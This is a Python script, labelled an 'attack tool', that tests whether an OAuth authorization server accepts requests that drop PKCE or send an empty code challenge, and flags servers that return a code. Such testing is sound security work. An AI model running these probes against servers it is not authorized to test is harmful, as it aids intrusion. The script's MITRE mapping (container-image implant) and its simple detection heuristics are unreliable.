#!/usr/bin/env python3
"""
OAuth PKCE Downgrade Attack Tool
Tests if an OAuth authorization server accepts downgraded flows
(from PKCE to plain authorization code).

MITRE ATT&CK:
  T1525 - Implant Container Image
  T1190 - Exploit Public-Facing Application
"""

import argparse
import sys
import signal
import time
import urllib.parse
from typing import Optional

import requests
from colorama import init, Fore, Style

init(autoreset=True)

RUNNING = True


def signal_handler(sig, frame):
    global RUNNING
    print(f"\n{Fore.YELLOW}[!] Interrupt received. Exiting gracefully...{Style.RESET_ALL}")
    RUNNING = False


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


class PKCEDowngradeTester:
    def __init__(self, auth_url: str, client_id: str, redirect_uri: str, timeout: int = 15):
        self.auth_url = auth_url
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "PKCEDowngradeTester/1.0",
            "Accept": "text/html,application/json,*/*",
        })

    def build_pkce_auth_url(self) -> str:
        """Build an authorization URL WITH PKCE (code_challenge)."""
        params = {
            "response_type": "code",
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid profile",
            "state": "pkce_state_test",
            "code_challenge": "9R__sK8B5cYxYxu5mPbvh9vLpQwjYQtQn3R4X5a6b7c",
            "code_challenge_method": "S256",
        }
        return f"{self.auth_url}?{urllib.parse.urlencode(params)}"

    def build_plain_auth_url(self) -> str:
        """Build an authorization URL WITHOUT PKCE (no code_challenge)."""
        params = {
            "response_type": "code",
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid profile",
            "state": "plain_state_test",
        }
        return f"{self.auth_url}?{urllib.parse.urlencode(params)}"

    def build_empty_challenge_url(self) -> str:
        """Build an authorization URL with empty code_challenge."""
        params = {
            "response_type": "code",
            "client_id": self.client_id,
            "redirect_uri": self.redirect_uri,
            "scope": "openid profile",
            "state": "empty_challenge_test",
            "code_challenge": "",
            "code_challenge_method": "S256",
        }
        return f"{self.auth_url}?{urllib.parse.urlencode(params)}"

    def test_flow(self, url: str) -> Optional[requests.Response]:
        """Send the authorization request and return the response."""
        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            return resp
        except requests.exceptions.Timeout:
            print(f"  {Fore.RED}[TIMEOUT] Request timed out after {self.timeout}s{Style.RESET_ALL}")
        except requests.exceptions.ConnectionError as e:
            print(f"  {Fore.RED}[CONNECTION ERROR] {e}{Style.RESET_ALL}")
        except requests.exceptions.RequestException as e:
            print(f"  {Fore.RED}[REQUEST ERROR] {e}{Style.RESET_ALL}")
        return None

    def analyze_response(self, resp: requests.Response, flow_name: str) -> int:
        """Analyze response to determine vulnerability. Returns 1 if vulnerable."""
        vuln_count = 0
        status = resp.status_code
        body_lower = resp.text.lower()
        location = resp.headers.get("Location", "").lower()

        print(f"  {Fore.CYAN}HTTP {status} | Content-Length: {len(resp.text)}{Style.RESET_ALL}")

        redirect_code = "code=" in location or "code=" in resp.url.lower()

        if redirect_code:
            print(f"  {Fore.GREEN}[+] Authorization code returned in redirect{Style.RESET_ALL}")

        error_params = "error=" in resp.url.lower() or "error=" in location
        error_indicators = [
            "invalid_request", "unauthorized_client", "access_denied",
            "unsupported_response_type", "invalid_scope", "server_error",
            "temporarily_unavailable", "interaction_required",
            "login_required", "account_selection_required",
            "consent_required", "invalid_grant",
        ]

        for err in error_indicators:
            if err in body_lower or err in resp.url.lower() or err in location:
                print(f"  {Fore.YELLOW}[!] Server error response: {err}{Style.RESET_ALL}")
                break

        pkce_required_indicators = [
            "code_challenge_required", "pkce_required", "missing code_challenge",
            "code challenge required", "pkce is required",
        ]
        pkce_mandatory = any(ind in body_lower or ind in location for ind in pkce_required_indicators)

        if pkce_mandatory:
            print(f"  {Fore.GREEN}[SECURE] Server rejects {flow_name}: PKCE required{Style.RESET_ALL}")
        elif redirect_code:
            print(f"  {Fore.RED}[VULNERABLE] Server accepted {flow_name} - "
                  f"PKCE downgrade possible!{Style.RESET_ALL}")
            vuln_count += 1
        elif status in (400, 401, 403):
            print(f"  {Fore.GREEN}[SECURE] Server rejected {flow_name} "
                  f"(HTTP {status}){Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[WARN] Ambiguous response for {flow_name} "
                  f"(HTTP {status}){Style.RESET_ALL}")

        return vuln_count


def main():
    parser = argparse.ArgumentParser(
        description="OAuth PKCE Downgrade Attack Tool - Test if a server accepts "
                    "downgraded authorization code flows",
        epilog="MITRE ATT&CK: T1525 (Implant Container Image), T1190 (Exploit Public-Facing Application)"
    )
    parser.add_argument("-u", "--auth-url", required=True,
                        help="OAuth authorization endpoint URL")
    parser.add_argument("-c", "--client-id", required=True,
                        help="OAuth client ID")
    parser.add_argument("-r", "--redirect-uri", required=True,
                        help="Redirect URI registered with the client")
    parser.add_argument("-t", "--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    args = parser.parse_args()

    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  OAuth PKCE Downgrade Attack Tool{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  Target: {args.auth_url}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  Client ID: {args.client_id}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")

    tester = PKCEDowngradeTester(args.auth_url, args.client_id, args.redirect_uri, args.timeout)
    total_vulns = 0

    # Test 1: PKCE-present (baseline)
    print(f"\n{Fore.BLUE}[*] Test 1: PKCE-present flow (baseline){Style.RESET_ALL}")
    pkce_url = tester.build_pkce_auth_url()
    print(f"  URL: {pkce_url[:80]}...")
    resp = tester.test_flow(pkce_url)
    if resp:
        tester.analyze_response(resp, "PKCE-present")
    if not RUNNING:
        sys.exit(0)

    # Test 2: PKCE-absent (downgrade)
    print(f"\n{Fore.BLUE}[*] Test 2: PKCE-absent flow (downgrade attempt){Style.RESET_ALL}")
    plain_url = tester.build_plain_auth_url()
    print(f"  URL: {plain_url[:80]}...")
    resp = tester.test_flow(plain_url)
    if resp:
        total_vulns += tester.analyze_response(resp, "PKCE-absent")
    if not RUNNING:
        sys.exit(0)

    # Test 3: Empty code_challenge
    print(f"\n{Fore.BLUE}[*] Test 3: Empty code_challenge parameter{Style.RESET_ALL}")
    empty_url = tester.build_empty_challenge_url()
    print(f"  URL: {empty_url[:80]}...")
    resp = tester.test_flow(empty_url)
    if resp:
        total_vulns += tester.analyze_response(resp, "empty challenge")
    if not RUNNING:
        sys.exit(0)

    # Summary
    print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
    if total_vulns > 0:
        print(f"{Fore.RED}[!] VULNERABLE: Server accepted {total_vulns} "
              f"downgraded flow(s){Style.RESET_ALL}")
        print(f"{Fore.RED}[!] PKCE enforcement is missing or incomplete{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] SECURE: Server enforces PKCE for all flows{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
